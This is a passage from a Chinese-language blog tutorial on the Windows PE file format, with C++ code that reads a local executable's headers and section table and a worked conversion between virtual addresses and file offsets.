class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\N1.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>,dos, nt, sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到各个区块以及FOA RVA的值</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014143505239.png" alt="image-20211014143505239"></p>
<h3 id="FOA转VA转换流程"><a href="#FOA转VA转换流程" class="headerlink" title="FOA转VA转换流程"></a>FOA转VA转换流程</h3><p>首先，拿到FOA偏移量:0x25A30</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014150205947.png" alt="image-20211014150205947"></p>
<p>1.判断FOA是否在PE文件头之中</p>
<ul>
<li>如果在PE文件头内 FOA =RVA </li>
<li>如果不在： 判断FOA位于哪个节，差值 = FOA - 节.PointerToRawData(R Offset) , RVA = 差值 + 节.VirtualAddress(RVA) </li>
</ul>
<p>2.VA = ImageBase + RVA</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014145843204.png" alt="image-20211014145843204"></p>
<h3 id="根据流程进行转换"><a href="#根据流程进行转换" class="headerlink" title="根据流程进行转换"></a>根据流程进行转换</h3><p><strong>1.判断FOA是否在文件头内</strong></p>
<p>根据e_ifanew找到PE头，发现相距甚远</p>
<p><strong>2.判断处于哪一区块</strong></p>
<p>FOA&gt;=节.PointerToRawData</p>
<p>FOA&lt;节.PointerToRawData + 当前节<strong>文件对齐</strong>后的大小=节.PointerToRawData+节.SizeOfRawData</p>
<p>翻译一下就是在哪份区块之中</p>
<p><strong>另外，利用FOA求VA时，由于是查找FOA在哪个区块中，因此要利用PointerToRawData（R Size）与 PointerToRawSize（R size)进行判断，而不是VirstualAddress(V Addr) 与 VirstualSize（V Size) 利用VA求FOA时则相反</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014150609609.png" alt="image-20211014150609609"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014151529385.png" alt="image-20211014151529385"></p>
<p>比较可知，根据FOA = 0x25A30可知，FOA在.idata区块之中</p>
<p>差值 = FOR - 节.PointerToRawData = 0x25A30 - 0x25000 = 0xA30</p>
<p>RVA = 节.VirstualAddress  + 差值 = 0x25000 + 0xA30 = 0x25A30</p>
<p><strong>VA = ImageBase + RVA = 0x400000 + 0x25A30 = 0x425A30</strong> </p>
<p>运行程序检验，发现完全吻合！</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014151728378.png" alt="image-20211014151728378"></p>
<h3 id="代码实现FOA-转-VA"><a href="#代码实现FOA-转-VA" class="headerlink" title="代码实现FOA 转 VA"></a>代码实现FOA 转 VA</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 